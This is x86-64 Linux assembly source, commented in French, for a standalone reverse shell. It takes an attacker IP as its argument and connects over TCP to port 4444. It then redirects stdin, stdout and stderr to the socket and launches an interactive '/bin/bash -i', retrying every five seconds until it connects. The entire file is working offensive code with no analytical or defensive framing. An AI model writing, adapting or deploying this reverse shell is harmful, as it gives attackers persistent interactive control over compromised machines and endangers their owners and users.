section .data
    command      db '/bin/bash',0
    port_str     db '4444',0
    
    ; Arguments pour execve
    bash_i       db '-i',0
    bash_args    dq command, bash_i, 0
    
    ; Messages d'erreur
    err_usage      db 'Usage: ./reverse <attacker_ip>',10,0
    err_ip_format  db 'Error: Invalid IP format',10,0
    err_socket     db 'Error: Socket creation failed',10,0
    err_connect    db 'Error: Connection failed',10,0
    timespec       dq 5, 0          ; 5 secondes entre les tentatives

section .bss
    ip_bytes    resd 1  ; IP en format réseau
    port_bytes  resw 1  ; Port en format réseau

section .text
    global _start

;----------------------------------------------------------
; Validation et conversion de l'IP
; Entrée : rdi = pointeur vers la chaîne IP
; Sortie : rax = 1 (succès), 0 (erreur)
;----------------------------------------------------------
validate_and_parse_ip:
    push rbp
    mov rbp, rsp
    push rbx
    push r12
    
    mov rsi, rdi        ; Pointeur vers la chaîne IP
    xor rbx, rbx        ; Compteur d'octets (0-3)
    xor r12d, r12d      ; Valeur IP accumulée
    xor eax, eax        ; Valeur temporaire pour l'octet courant

.parse_loop:
    movzx edx, byte [rsi] ; Charger le caractère suivant
    test dl, dl         ; Vérifier fin de chaîne
    jz .end_parse
    
    cmp dl, '.'         ; Séparateur d'octet 
    je .store_octet
    
    ; Vérifier que c'est un chiffre (0-9)
    cmp dl, '0'
    jb .invalid
    cmp dl, '9'
    ja .invalid
    
    ; Convertir ASCII -> décimal
    sub dl, '0'
    imul eax, 10        ; Multiplier la valeur actuelle par 10
    add eax, edx        ; Ajouter le nouveau chiffre
    cmp eax, 255        ; Vérifier dépassement
    ja .invalid
    
    inc rsi             ; Caractère suivant
    jmp .parse_loop

.store_octet:
    cmp bl, 3           ; Vérifier qu'on a pas déjà 4 octets
    jae .invalid
    
    shl r12d, 8         ; Décaler pour faire de la place
    or r12d, eax        ; Ajouter l'octet courant
    inc bl              ; Incrémenter le compteur d'octets
    xor eax, eax        ; Réinitialiser la valeur temporaire
    inc rsi             ; Passer le point
    jmp .parse_loop

.end_parse:
    cmp bl, 3           ; Vérifier qu'on a exactement 4 octets
    jne .invalid
    
    ; Ajouter le dernier octet
    shl r12d, 8
    or r12d, eax
    
    ; Convertir en ordre réseau (big-endian)
    bswap r12d
    mov [ip_bytes], r12d
    mov rax, 1          ; Succès
    jmp .done

.invalid:
    xor rax, rax        ; Erreur

.done:
    pop r12
    pop rbx
    pop rbp
    ret

;----------------------------------------------------------
; Validation et conversion du port (fixé à 4444)
;----------------------------------------------------------
validate_port:
    mov rsi, port_str
    xor rax, rax        ; Valeur accumulée
    xor rcx, rcx        ; Compteur de chiffres

.convert_loop:
    movzx edx, byte [rsi]
    test dl, dl
    jz .check_value
    
    ; Vérifier chiffre
    cmp dl, '0'
    jb .invalid
    cmp dl, '9'
    ja .invalid
    
    ; Convertir et accumuler
    sub dl, '0'
    imul rax, 10
    add rax, rdx
    cmp rax, 65535      ; Port max
    ja .invalid
    
    inc rsi
    inc rcx
    jmp .convert_loop

.check_value:
    test rcx, rcx       ; Vérifier au moins un chiffre
    jz .invalid
    
    ; Stocker en ordre réseau
    xchg al, ah         ; Convertir en big-endian
    mov [port_bytes], ax
    mov rax, 1
    ret

.invalid:
    xor rax, rax
    ret

;----------------------------------------------------------
; Programme principal
;----------------------------------------------------------
_start:
    ; Récupération des arguments
    pop rcx             ; argc
    pop rsi             ; argv[0] (nom du programme)
    
    ; Vérifier nombre d'arguments
    cmp rcx, 2
    jne .usage_error
    
    ; Récupérer l'adresse IP (argv[1])
    pop rdi
    call validate_and_parse_ip
    test rax, rax
    jz .ip_error
    
    ; Valider le port (toujours 4444)
    call validate_port
    test rax, rax
    jz .port_error

.connection_loop:
    ; Création du socket
    mov rax, 41         ; sys_socket
    mov rdi, 2          ; AF_INET (IPv4)
    mov rsi, 1          ; SOCK_STREAM (TCP)
    xor rdx, rdx        ; Protocole (0 = auto)
    syscall
    
    ; Vérifier si le socket a été créé
    test rax, rax
    js .socket_error    ; Gestion erreur socket
    mov r8, rax         ; Sauvegarder le descripteur de fichier

    ; Préparation de la structure d'adresse
    sub rsp, 16         ; Allouer de l'espace sur la pile
    mov word [rsp], 2          ; AF_INET
    mov ax, [port_bytes]       ; Port en ordre réseau
    mov word [rsp+2], ax
    mov eax, [ip_bytes]        ; Adresse IP en ordre réseau
    mov dword [rsp+4], eax
    mov qword [rsp+8], 0       ; Padding

    ; Connexion au serveur
    mov rax, 42         ; sys_connect
    mov rdi, r8         ; socket fd
    mov rsi, rsp        ; pointeur vers sockaddr_in
    mov rdx, 16         ; taille de la structure
    syscall
    
    add rsp, 16         ; Nettoyer la pile
    test rax, rax
    js .connect_error   ; Gestion erreur connexion

    ; Redirection des flux standard
    xor rsi, rsi        ; Commencer par stdin (0)
.dup_loop:
    mov rax, 33         ; sys_dup2
    mov rdi, r8         ; socket fd (source)
    ; rsi = fd cible (0, 1, 2)
    syscall
    
    ; Passer au flux suivant
    inc rsi
    cmp rsi, 3          ; Vérifier si on a traité stderr (2)
    jne .dup_loop

    ; Lancement du shell interactif simple
    mov rax, 59         ; sys_execve
    lea rdi, [command]  ; Chemin du programme
    lea rsi, [bash_args] ; Arguments: ["/bin/bash", "-i", NULL]
    xor rdx, rdx        ; Environnement = NULL
    syscall

    ; Si execve échoue, on quitte
    jmp .exit

;----------------------------------------------------------
; Gestion des erreurs
;----------------------------------------------------------
.usage_error:
    mov rax, 1          ; sys_write
    mov rdi, 2          ; stderr
    lea rsi, [err_usage]
    mov rdx, 30         ; Longueur du message
    syscall
    mov rdi, 1
    jmp .exit

.ip_error:
    mov rax, 1
    mov rdi, 2
    lea rsi, [err_ip_format]
    mov rdx, 25
    syscall
    mov rdi, 1
    jmp .exit

.port_error:
    ; Cette erreur ne devrait normalement pas se produire
    mov rdi, 1
    jmp .exit

.socket_error:
    mov rax, 1
    mov rdi, 2
    lea rsi, [err_socket]
    mov rdx, 28
    syscall
    mov rdi, 1
    jmp .exit

.connect_error:
    ; Fermer le socket
    mov rax, 3          ; sys_close
    mov rdi, r8
    syscall
    
    ; Attendre avant de réessayer
    mov rax, 35         ; sys_nanosleep
    lea rdi, [timespec] ; Temps d'attente
    xor rsi, rsi        ; Pas de temps restant
    syscall
    
    ; Nouvelle tentative de connexion
    jmp .connection_loop

.exit:
    ; Quitter le programme
    mov rax, 60         ; sys_exit
    syscall